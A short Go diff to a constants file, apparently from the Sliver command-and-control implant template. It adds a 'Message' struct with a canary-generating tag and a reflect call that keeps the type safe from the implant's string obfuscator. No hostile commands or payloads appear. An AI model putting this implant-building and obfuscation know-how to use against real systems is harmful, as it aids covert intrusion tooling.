@@ -1,5 +1,7 @@
 package constants
 
+import "reflect"
+
 // Ironically not consts, becuase our string obfuscator only works on `var`s
 
 /*
@@ -24,3 +26,11 @@ package constants
 var (
 	SliverName = `{{.Name}}`
 )
+
+// Message - Fake message for embedding canaries
+type Message struct {
+	Command string `c2:"[[GenerateCanary]]"`
+}
+
+// never obfuscate the Message type
+var _ = reflect.TypeOf(Message{})
